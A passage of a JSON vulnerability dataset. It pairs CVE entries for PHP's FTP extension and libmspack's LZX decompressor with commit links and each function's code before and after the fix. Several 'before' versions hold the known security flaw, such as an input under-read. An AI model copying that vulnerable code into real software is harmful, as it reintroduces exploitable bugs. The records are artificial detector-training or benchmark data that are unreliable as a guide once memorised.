*/\n\tfor (ptr = ftp->inbuf; *ptr && !isdigit(*ptr); ptr++);\n\tn = sscanf(ptr, \"%lu,%lu,%lu,%lu,%lu,%lu\", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);\n\tif (n != 6) {\n\t\treturn 0;\n\t}\n\tfor (n = 0; n < 6; n++) {\n\t\tipbox.c[n] = (unsigned char) b[n];\n\t}\n\tsin = (struct sockaddr_in *) sa;\n\tsin->sin_family = AF_INET;\n\tsin->sin_addr = ipbox.ia[0];\n\tsin->sin_port = ipbox.s[2];\n\n\tftp->pasv = 2;\n\n\treturn 1;\n}",
        "func": "int\nftp_pasv(ftpbuf_t *ftp, int pasv)\n{\n\tchar\t\t\t*ptr;\n\tunion ipbox\t\tipbox;\n\tunsigned long\t\tb[6];\n\tsocklen_t\t\t\tn;\n\tstruct sockaddr *sa;\n\tstruct sockaddr_in *sin;\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (pasv && ftp->pasv == 2) {\n\t\treturn 1;\n\t}\n\tftp->pasv = 0;\n\tif (!pasv) {\n\t\treturn 1;\n\t}\n\tn = sizeof(ftp->pasvaddr);\n\tmemset(&ftp->pasvaddr, 0, n);\n\tsa = (struct sockaddr *) &ftp->pasvaddr;\n\n#if HAVE_IPV6\n\tif (getpeername(ftp->fd, sa, &n) < 0) {\n\t\treturn 0;\n\t}\n\tif (sa->sa_family == AF_INET6) {\n\t\tstruct sockaddr_in6 *sin6 = (struct sockaddr_in6 *) sa;\n\t\tchar *endptr, delimiter;\n\n\t\t/* try EPSV first */\n\t\tif (!ftp_putcmd(ftp, \"EPSV\", NULL)) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (!ftp_getresp(ftp)) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (ftp->resp == 229) {\n\t\t\t/* parse out the port */\n\t\t\tfor (ptr = ftp->inbuf; *ptr && *ptr != '('; ptr++);\n\t\t\tif (!*ptr) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tdelimiter = *++ptr;\n\t\t\tfor (n = 0; *ptr && n < 3; ptr++) {\n\t\t\t\tif (*ptr == delimiter) {\n\t\t\t\t\tn++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tsin6->sin6_port = htons((unsigned short) strtoul(ptr, &endptr, 10));\n\t\t\tif (ptr == endptr || *endptr != delimiter) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tftp->pasv = 2;\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\t/* fall back to PASV */\n#endif\n\n\tif (!ftp_putcmd(ftp, \"PASV\", NULL)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 227) {\n\t\treturn 0;\n\t}\n\t/* parse out the IP and port */\n\tfor (ptr = ftp->inbuf; *ptr && !isdigit(*ptr); ptr++);\n\tn = sscanf(ptr, \"%lu,%lu,%lu,%lu,%lu,%lu\", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);\n\tif (n != 6) {\n\t\treturn 0;\n\t}\n\tfor (n = 0; n < 6; n++) {\n\t\tipbox.c[n] = (unsigned char) b[n];\n\t}\n\tsin = (struct sockaddr_in *) sa;\n\tsin->sin_family = AF_INET;\n\tsin->sin_addr = ipbox.ia[0];\n\tsin->sin_port = ipbox.s[2];\n\n\tftp->pasv = 2;\n\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -65,7 +65,7 @@\n \tif (!ftp_putcmd(ftp, \"PASV\", NULL)) {\n \t\treturn 0;\n \t}\n-\tif (!ftp_getresp(ftp) || ftp->resp != 227) { \n+\tif (!ftp_getresp(ftp) || ftp->resp != 227) {\n \t\treturn 0;\n \t}\n \t/* parse out the IP and port */",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 227) { "
            ],
            "added_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 227) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_pwd",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "const char*\nftp_pwd(ftpbuf_t *ftp)\n{\n\tchar *pwd, *end;\n\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\n\t/* default to cached value */\n\tif (ftp->pwd) {\n\t\treturn ftp->pwd;\n\t}\n\tif (!ftp_putcmd(ftp, \"PWD\", NULL)) {\n\t\treturn NULL;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 257) { \n\t\treturn NULL;\n\t}\n\t/* copy out the pwd from response */\n\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) { \n\t\treturn NULL;\n\t}\n\tif ((end = strrchr(++pwd, '\"')) == NULL) { \n\t\treturn NULL;\n\t}\n\tftp->pwd = estrndup(pwd, end - pwd);\n\n\treturn ftp->pwd;\n}",
        "func": "const char*\nftp_pwd(ftpbuf_t *ftp)\n{\n\tchar *pwd, *end;\n\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\n\t/* default to cached value */\n\tif (ftp->pwd) {\n\t\treturn ftp->pwd;\n\t}\n\tif (!ftp_putcmd(ftp, \"PWD\", NULL)) {\n\t\treturn NULL;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 257) {\n\t\treturn NULL;\n\t}\n\t/* copy out the pwd from response */\n\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) {\n\t\treturn NULL;\n\t}\n\tif ((end = strrchr(++pwd, '\"')) == NULL) {\n\t\treturn NULL;\n\t}\n\tftp->pwd = estrndup(pwd, end - pwd);\n\n\treturn ftp->pwd;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,14 +14,14 @@\n \tif (!ftp_putcmd(ftp, \"PWD\", NULL)) {\n \t\treturn NULL;\n \t}\n-\tif (!ftp_getresp(ftp) || ftp->resp != 257) { \n+\tif (!ftp_getresp(ftp) || ftp->resp != 257) {\n \t\treturn NULL;\n \t}\n \t/* copy out the pwd from response */\n-\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) { \n+\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) {\n \t\treturn NULL;\n \t}\n-\tif ((end = strrchr(++pwd, '\"')) == NULL) { \n+\tif ((end = strrchr(++pwd, '\"')) == NULL) {\n \t\treturn NULL;\n \t}\n \tftp->pwd = estrndup(pwd, end - pwd);",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 257) { ",
                "\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) { ",
                "\tif ((end = strrchr(++pwd, '\"')) == NULL) { "
            ],
            "added_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 257) {",
                "\tif ((pwd = strchr(ftp->inbuf, '\"')) == NULL) {",
                "\tif ((end = strrchr(++pwd, '\"')) == NULL) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/my_send",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nmy_send(ftpbuf_t *ftp, php_socket_t s, void *buf, size_t len)\n{\n\tlong\t\tsize, sent;\n    int         n;\n\n\tsize = len;\n\twhile (size) {\n\t\tn = php_pollfd_for_ms(s, POLLOUT, ftp->timeout_sec * 1000);\n\n\t\tif (n < 1) {\n\n#if !defined(PHP_WIN32) && !(defined(NETWARE) && defined(USE_WINSOCK))\n\t\t\tif (n == 0) {\n\t\t\t\terrno = ETIMEDOUT;\n\t\t\t}\n#endif\n\t\t\treturn -1;\n\t\t}\n\n#if HAVE_OPENSSL_EXT\n\t\tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n\t\t\tsent = SSL_write(ftp->ssl_handle, buf, size);\n\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t\n\t\t\tsent = SSL_write(ftp->data->ssl_handle, buf, size);\n\t\t} else {\n#endif\n\t\t\tsent = send(s, buf, size, 0);\n#if HAVE_OPENSSL_EXT\n\t\t}\n#endif\n\t\tif (sent == -1) {\n\t\t\treturn -1;\n\t\t}\n\n\t\tbuf = (char*) buf + sent;\n\t\tsize -= sent;\n\t}\n\n\treturn len;\n}",
        "func": "int\nmy_send(ftpbuf_t *ftp, php_socket_t s, void *buf, size_t len)\n{\n\tlong\t\tsize, sent;\n    int         n;\n\n\tsize = len;\n\twhile (size) {\n\t\tn = php_pollfd_for_ms(s, POLLOUT, ftp->timeout_sec * 1000);\n\n\t\tif (n < 1) {\n\n#if !defined(PHP_WIN32) && !(defined(NETWARE) && defined(USE_WINSOCK))\n\t\t\tif (n == 0) {\n\t\t\t\terrno = ETIMEDOUT;\n\t\t\t}\n#endif\n\t\t\treturn -1;\n\t\t}\n\n#if HAVE_OPENSSL_EXT\n\t\tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n\t\t\tsent = SSL_write(ftp->ssl_handle, buf, size);\n\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\n\t\t\tsent = SSL_write(ftp->data->ssl_handle, buf, size);\n\t\t} else {\n#endif\n\t\t\tsent = send(s, buf, size, 0);\n#if HAVE_OPENSSL_EXT\n\t\t}\n#endif\n\t\tif (sent == -1) {\n\t\t\treturn -1;\n\t\t}\n\n\t\tbuf = (char*) buf + sent;\n\t\tsize -= sent;\n\t}\n\n\treturn len;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -21,7 +21,7 @@\n #if HAVE_OPENSSL_EXT\n \t\tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n \t\t\tsent = SSL_write(ftp->ssl_handle, buf, size);\n-\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t\n+\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\n \t\t\tsent = SSL_write(ftp->data->ssl_handle, buf, size);\n \t\t} else {\n #endif",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t"
            ],
            "added_lines": [
                "\t\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/data_close",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "databuf_t*\ndata_close(ftpbuf_t *ftp, databuf_t *data)\n{\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t\t*ctx;\n#endif\t\t\t\t\n\tif (data == NULL) {\n\t\treturn NULL;\n\t}\n\tif (data->listener != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (data->ssl_active) {\n\t\t\n\t\t\tctx = SSL_get_SSL_CTX(data->ssl_handle);\n\t\t\tSSL_CTX_free(ctx);\n\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\tdata->ssl_active = 0;\n\t\t}\n#endif\t\t\t\t\n\t\tclosesocket(data->listener);\n\t}\t\n\tif (data->fd != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (data->ssl_active) {\n\t\t\tctx = SSL_get_SSL_CTX(data->ssl_handle);\n\t\t\tSSL_CTX_free(ctx);\n\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\tdata->ssl_active = 0;\n\t\t}\n#endif\t\t\t\t\n\t\tclosesocket(data->fd);\n\t}\t\n\tif (ftp) {\n\t\tftp->data = NULL;\n\t}\n\tefree(data);\n\treturn NULL;\n}",
        "func": "databuf_t*\ndata_close(ftpbuf_t *ftp, databuf_t *data)\n{\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t\t*ctx;\n#endif\n\tif (data == NULL) {\n\t\treturn NULL;\n\t}\n\tif (data->listener != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (data->ssl_active) {\n\n\t\t\tctx = SSL_get_SSL_CTX(data->ssl_handle);\n\t\t\tSSL_CTX_free(ctx);\n\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\tdata->ssl_active = 0;\n\t\t}\n#endif\n\t\tclosesocket(data->listener);\n\t}\n\tif (data->fd != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (data->ssl_active) {\n\t\t\tctx = SSL_get_SSL_CTX(data->ssl_handle);\n\t\t\tSSL_CTX_free(ctx);\n\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\tdata->ssl_active = 0;\n\t\t}\n#endif\n\t\tclosesocket(data->fd);\n\t}\n\tif (ftp) {\n\t\tftp->data = NULL;\n\t}\n\tefree(data);\n\treturn NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,14 +3,14 @@\n {\n #if HAVE_OPENSSL_EXT\n \tSSL_CTX\t\t*ctx;\n-#endif\t\t\t\t\n+#endif\n \tif (data == NULL) {\n \t\treturn NULL;\n \t}\n \tif (data->listener != -1) {\n #if HAVE_OPENSSL_EXT\n \t\tif (data->ssl_active) {\n-\t\t\n+\n \t\t\tctx = SSL_get_SSL_CTX(data->ssl_handle);\n \t\t\tSSL_CTX_free(ctx);\n \n@@ -18,9 +18,9 @@\n \t\t\tSSL_free(data->ssl_handle);\n \t\t\tdata->ssl_active = 0;\n \t\t}\n-#endif\t\t\t\t\n+#endif\n \t\tclosesocket(data->listener);\n-\t}\t\n+\t}\n \tif (data->fd != -1) {\n #if HAVE_OPENSSL_EXT\n \t\tif (data->ssl_active) {\n@@ -31,9 +31,9 @@\n \t\t\tSSL_free(data->ssl_handle);\n \t\t\tdata->ssl_active = 0;\n \t\t}\n-#endif\t\t\t\t\n+#endif\n \t\tclosesocket(data->fd);\n-\t}\t\n+\t}\n \tif (ftp) {\n \t\tftp->data = NULL;\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                "#endif\t\t\t\t",
                "\t\t",
                "#endif\t\t\t\t",
                "\t}\t",
                "#endif\t\t\t\t",
                "\t}\t"
            ],
            "added_lines": [
                "#endif",
                "",
                "#endif",
                "\t}",
                "#endif",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4471",
        "func_name": "kyz/libmspack/lzxd_decompress",
        "description": "Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.",
        "git_url": "https://github.com/kyz/libmspack/commit/18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3",
        "commit_title": "Prevent a 1-byte underread of the input buffer if an odd-sized data block comes just before an uncompressed block header",
        "commit_text": "",
        "func_before": "int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n  /* bitstream and huffman reading variables */\n  register unsigned int bit_buffer;\n  register int bits_left, i=0;\n  unsigned char *i_ptr, *i_end;\n  register unsigned short sym;\n\n  int match_length, length_footer, extra, verbatim_bits, bytes_todo;\n  int this_run, main_element, aligned_bits, j;\n  unsigned char *window, *runsrc, *rundest, buf[12];\n  unsigned int frame_size=0, end_frame, match_offset, window_posn;\n  unsigned int R0, R1, R2;\n\n  /* easy answers */\n  if (!lzx || (out_bytes < 0)) return MSPACK_ERR_ARGS;\n  if (lzx->error) return lzx->error;\n\n  /* flush out any stored-up bytes before we begin */\n  i = lzx->o_end - lzx->o_ptr;\n  if ((off_t) i > out_bytes) i = (int) out_bytes;\n  if (i) {\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n  }\n  if (out_bytes == 0) return MSPACK_ERR_OK;\n\n  /* restore local state */\n  RESTORE_BITS;\n  window = lzx->window;\n  window_posn = lzx->window_posn;\n  R0 = lzx->R0;\n  R1 = lzx->R1;\n  R2 = lzx->R2;\n\n  end_frame = (unsigned int)((lzx->offset + out_bytes) / LZX_FRAME_SIZE) + 1;\n\n  while (lzx->frame < end_frame) {\n    /* have we reached the reset interval? (if there is one?) */\n    if (lzx->reset_interval && ((lzx->frame % lzx->reset_interval) == 0)) {\n      if (lzx->block_remaining) {\n\tD((\"%d bytes remaining at reset interval\", lzx->block_remaining))\n\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n      }\n\n      /* re-read the intel header and reset the huffman lengths */\n      lzxd_reset_state(lzx);\n      R0 = lzx->R0;\n      R1 = lzx->R1;\n      R2 = lzx->R2;\n    }\n\n    /* LZX DELTA format has chunk_size, not present in LZX format */\n    if (lzx->is_delta) {\n      ENSURE_BITS(16);\n      REMOVE_BITS(16);\n    }\n\n    /* read header if necessary */\n    if (!lzx->header_read) {\n      /* read 1 bit. if bit=0, intel filesize = 0.\n       * if bit=1, read intel filesize (32 bits) */\n      j = 0; READ_BITS(i, 1); if (i) { READ_BITS(i, 16); READ_BITS(j, 16); }\n      lzx->intel_filesize = (i << 16) | j;\n      lzx->header_read = 1;\n    } \n\n    /* calculate size of frame: all frames are 32k except the final frame\n     * which is 32kb or less. this can only be calculated when lzx->length\n     * has been filled in. */\n    frame_size = LZX_FRAME_SIZE;\n    if (lzx->length && (lzx->length - lzx->offset) < (off_t)frame_size) {\n      frame_size = lzx->length - lzx->offset;\n    }\n\n    /* decode until one more frame is available */\n    bytes_todo = lzx->frame_posn + frame_size - window_posn;\n    while (bytes_todo > 0) {\n      /* initialise new block, if one is needed */\n      if (lzx->block_remaining == 0) {\n\t/* realign if previous block was an odd-sized UNCOMPRESSED block */\n\tif ((lzx->block_type == LZX_BLOCKTYPE_UNCOMPRESSED) &&\n\t    (lzx->block_length & 1))\n\t{\n\t  READ_IF_NEEDED;\n\t  i_ptr++;\n\t}\n\n\t/* read block type (3 bits) and block length (24 bits) */\n\tREAD_BITS(lzx->block_type, 3);\n\tREAD_BITS(i, 16); READ_BITS(j, 8);\n\tlzx->block_remaining = lzx->block_length = (i << 8) | j;\n\t/*D((\"new block t%d len %u\", lzx->block_type, lzx->block_length))*/\n\n\t/* read individual block headers */\n\tswitch (lzx->block_type) {\n\tcase LZX_BLOCKTYPE_ALIGNED:\n\t  /* read lengths of and build aligned huffman decoding tree */\n\t  for (i = 0; i < 8; i++) { READ_BITS(j, 3); lzx->ALIGNED_len[i] = j; }\n\t  BUILD_TABLE(ALIGNED);\n\t  /* no break -- rest of aligned header is same as verbatim */\n\tcase LZX_BLOCKTYPE_VERBATIM:\n\t  /* read lengths of and build main huffman decoding tree */\n\t  READ_LENGTHS(MAINTREE, 0, 256);\n\t  READ_LENGTHS(MAINTREE, 256, LZX_NUM_CHARS + lzx->num_offsets);\n\t  BUILD_TABLE(MAINTREE);\n\t  /* if the literal 0xE8 is anywhere in the block... */\n\t  if (lzx->MAINTREE_len[0xE8] != 0) lzx->intel_started = 1;\n\t  /* read lengths of and build lengths huffman decoding tree */\n\t  READ_LENGTHS(LENGTH, 0, LZX_NUM_SECONDARY_LENGTHS);\n\t  BUILD_TABLE_MAYBE_EMPTY(LENGTH);\n\t  break;\n\n\tcase LZX_BLOCKTYPE_UNCOMPRESSED:\n\t  /* because we can't assume otherwise */\n\t  lzx->intel_started = 1;\n\n\t  /* read 1-16 (not 0-15) bits to align to bytes */\n\t  ENSURE_BITS(16);\n\t  if (bits_left > 16) i_ptr -= 2;\n\t  bits_left = 0; bit_buffer = 0;\n\n\t  /* read 12 bytes of stored R0 / R1 / R2 values */\n\t  for (rundest = &buf[0], i = 0; i < 12; i++) {\n\t    READ_IF_NEEDED;\n\t    *rundest++ = *i_ptr++;\n\t  }\n\t  R0 = buf[0] | (buf[1] << 8) | (buf[2]  << 16) | (buf[3]  << 24);\n\t  R1 = buf[4] | (buf[5] << 8) | (buf[6]  << 16) | (buf[7]  << 24);\n\t  R2 = buf[8] | (buf[9] << 8) | (buf[10] << 16) | (buf[11] << 24);\n\t  break;\n\n\tdefault:\n\t  D((\"bad block type\"))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n      }\n\n      /* decode more of the block:\n       * run = min(what's available, what's needed) */\n      this_run = lzx->block_remaining;\n      if (this_run > bytes_todo) this_run = bytes_todo;\n\n      /* assume we decode exactly this_run bytes, for now */\n      bytes_todo           -= this_run;\n      lzx->block_remaining -= this_run;\n\n      /* decode at least this_run bytes */\n      switch (lzx->block_type) {\n      case LZX_BLOCKTYPE_VERBATIM:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n\t      if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              }\n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                                  break;\n\t    case 1: match_offset = R1; R1=R0;        R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2=R0;        R0 = match_offset; break;\n\t    case 3: match_offset = 1;  R2=R1; R1=R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      READ_BITS(verbatim_bits, extra);\n\t      match_offset = position_base[match_offset] - 2 + verbatim_bits;\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\t    \n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_ALIGNED:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n              if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              } \n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                             break;\n\t    case 1: match_offset = R1; R1 = R0; R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2 = R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      match_offset = position_base[match_offset] - 2;\n\t      if (extra > 3) {\n\t\t/* verbatim and aligned bits */\n\t\textra -= 3;\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += (verbatim_bits << 3);\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra == 3) {\n\t\t/* aligned bits only */\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra > 0) { /* extra==1, extra==2 */\n\t\t/* verbatim bits only */\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += verbatim_bits;\n\t      }\n\t      else /* extra == 0 */ {\n\t\t/* ??? not defined in LZX specification! */\n\t\tmatch_offset = 1;\n\t      }\n\t      /* update repeated offset LRU queue */\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = 